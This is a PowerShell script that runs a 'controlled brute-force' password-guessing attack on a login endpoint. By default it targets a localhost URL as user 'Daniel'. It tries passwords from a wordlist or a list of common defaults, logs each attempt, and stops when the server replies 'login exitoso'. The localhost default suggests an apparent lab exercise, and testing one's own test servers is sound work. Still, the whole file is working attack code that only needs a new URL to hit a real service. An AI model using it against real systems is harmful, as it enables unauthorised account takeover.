param(
    [string]$URL = "http://127.0.0.1:8000/login",
    [string]$USER = "Daniel"
)

$WORDLIST = "wordlist.txt"   
$LOGFILE = "attack_log.txt"
$DEFAULT_PASSWORDS = @("1234","0000","1111","123456","password","admin123")


"=== Controlled brute-force ===" | Out-File -FilePath $LOGFILE -Encoding utf8
("Target: {0}  user: {1}" -f $URL, $USER) | Tee-Object -FilePath $LOGFILE -Append
("Start: {0}" -f (Get-Date).ToString("o")) | Tee-Object -FilePath $LOGFILE -Append


if (Test-Path $WORDLIST) {
    $PASSWORDS = Get-Content -Path $WORDLIST | Where-Object { $_ -ne "" }
    ("Using wordlist: {0} ({1} passwords)" -f $WORDLIST, ($PASSWORDS.Count)) | Tee-Object -FilePath $LOGFILE -Append
} else {
    $PASSWORDS = $DEFAULT_PASSWORDS
    ("No wordlist found - using default list ({0})" -f $PASSWORDS.Count) | Tee-Object -FilePath $LOGFILE -Append
}

$attempts = 0
$found_pw = $null
$sw = [System.Diagnostics.Stopwatch]::StartNew()

foreach ($pw in $PASSWORDS) {
    $attempts++

    ("Attempt #{0} -> {1} ..." -f $attempts, $pw) | Tee-Object -FilePath $LOGFILE -Append
    try {
        $body = @{ username = $USER; password = $pw } | ConvertTo-Json -Compress

        $response = Invoke-RestMethod -Method Post -Uri $URL -Body $body -ContentType "application/json" -TimeoutSec 5 -ErrorAction Stop
        $respText = ($response | ConvertTo-Json -Compress) -replace '"',''
        ("Response: {0}" -f $respText) | Tee-Object -FilePath $LOGFILE -Append
    } catch {
        ("ERROR in request: {0}" -f $_.Exception.Message) | Tee-Object -FilePath $LOGFILE -Append
        Start-Sleep -Milliseconds 50
        continue
    }


    $respValue = $null
    try {
        if ($response -is [string]) { $respValue = $response }
        elseif ($response -is [System.Management.Automation.PSCustomObject] -and $response.resp) { $respValue = $response.resp }
        else { $respValue = $response | ConvertTo-Json -Compress }
    } catch {
        $respValue = $response.ToString()
    }

    if ($respValue -match "login exitoso") {
        $found_pw = $pw
        $sw.Stop()
        ("`n>>> FOUND password: {0} (attempts={1}, time={2}s)" -f $found_pw, $attempts, "{0:N3}" -f $sw.Elapsed.TotalSeconds) | Tee-Object -FilePath $LOGFILE -Append
        break
    }

    Start-Sleep -Milliseconds 50
}

if ($sw.IsRunning) { $sw.Stop() }
$total_time = "{0:N3}" -f $sw.Elapsed.TotalSeconds

if ($found_pw) {
    ("Result: password found: {0}" -f $found_pw) | Tee-Object -FilePath $LOGFILE -Append
} else {
    ("Result: not found in list (attempts={0})" -f $attempts) | Tee-Object -FilePath $LOGFILE -Append
}

("Total time: {0}s" -f $total_time) | Tee-Object -FilePath $LOGFILE -Append
("End: {0}" -f (Get-Date).ToString("o")) | Tee-Object -FilePath $LOGFILE -Append
("Log saved at: {0}" -f (Resolve-Path $LOGFILE).Path) | Tee-Object -FilePath $LOGFILE -Append